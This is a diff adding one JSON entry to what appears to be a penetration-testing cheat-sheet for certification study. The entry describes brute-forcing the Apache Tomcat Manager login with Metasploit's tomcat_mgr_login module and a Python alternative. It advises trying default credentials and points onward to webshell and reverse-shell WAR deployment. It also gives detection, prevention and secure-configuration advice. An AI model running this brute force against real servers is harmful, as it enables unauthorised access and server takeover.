@@ -1,0 +1,105 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "metasploit"
+  ],
+  "tags": [
+    "tomcat",
+    "brute-force"
+  ],
+  "category": "Password Attacks",
+  "subcategory": "Tomcat",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Set the Tomcat vhost",
+      "command": "set VHOST web01.inlanefreight.local"
+    },
+    {
+      "label": "Set the manager port",
+      "command": "set RPORT 8180"
+    },
+    {
+      "label": "Stop on the first valid credential",
+      "command": "set stop_on_success true"
+    },
+    {
+      "label": "Run the manager login brute-force",
+      "command": "run"
+    },
+    {
+      "label": "Pure-python alternative brute-forcer",
+      "command": "# or python: python3 mgr_brute.py -U http://<url>:8180/ -P /manager -u users.txt -p pass.txt"
+    }
+  ],
+  "notes": "tomcat:tomcat and admin:admin land constantly - always try defaults before a full wordlist. Manager creds live in tomcat-users.xml, which Ghostcat can sometimes read without auth.",
+  "references": [
+    {
+      "title": "Metasploit Framework",
+      "url": "https://www.metasploit.com/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "tomcat-discovery",
+      "note": "Locates the manager app first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "tomcat-war-webshell",
+      "note": "Deploy a WAR webshell with the cracked creds.",
+      "rel": "next"
+    },
+    {
+      "id": "tomcat-msfvenom-war",
+      "note": "Deploy a msfvenom reverse-shell WAR instead.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "tomcat-mgr-bruteforce",
+  "name": "Tomcat - Manager Brute Force (Metasploit)",
+  "command": "use auxiliary/scanner/http/tomcat_mgr_login",
+  "description": "Brute-forces the Tomcat Manager/Host-Manager HTTP Basic auth using default credential lists. Manager access allows WAR deployment for RCE.",
+  "opsec": "loud",
+  "mitre": [
+    "T1110"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Tomcat's /manager/html endpoint uses HTTP Basic Authentication backed by tomcat-users.xml. Default installs use weak credentials (admin:admin, tomcat:tomcat). No lockout policy is configured by default.",
+    "prerequisites": "Network access to /manager/html. No lockout policy. Weak or default credentials in tomcat-users.xml.",
+    "impact": "Manager access enables WAR deployment -- complete server takeover via uploaded webshell or reverse-shell WAR.",
+    "detection": "High-volume 401 responses followed by 200 to /manager/html. Rapid Basic Auth attempts from one IP. Tomcat access log showing manager authentication failures.",
+    "artifacts": "Tomcat access_log showing 401s to /manager | catalina.out authentication failure entries | IDS alert for HTTP Basic Auth brute force",
+    "prevention": "Change default manager credentials. Restrict /manager to localhost via RemoteAddrValve. Implement lockout via reverse proxy. Require client certificate in high-security environments.",
+    "misconfiguration": "tomcat-users.xml has manager-gui role assigned to default credentials. /manager accessible from all IP addresses without lockout.",
+    "vulnerable_config": "<!-- tomcat-users.xml default -->\n<role rolename=\"manager-gui\"/>\n<user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui\"/>\n<user username=\"admin\" password=\"admin\" roles=\"manager-gui,admin-gui\"/>",
+    "secure_config": "<!-- Strong unique credential -->\n<user username=\"mgr_ops\" password=\"(strong-random-pass)\"\n      roles=\"manager-script\"/>\n<!-- context.xml for manager -->\n<Valve className=\"org.apache.catalina.valves.RemoteAddrValve\"\n       allow=\"127\\.\\d+\\.\\d+\\.\\d+\"/>",
+    "sources": [
+      "HTB M24",
+      "MITRE T1110",
+      "OWASP A07:2021"
+    ]
+  }
+}
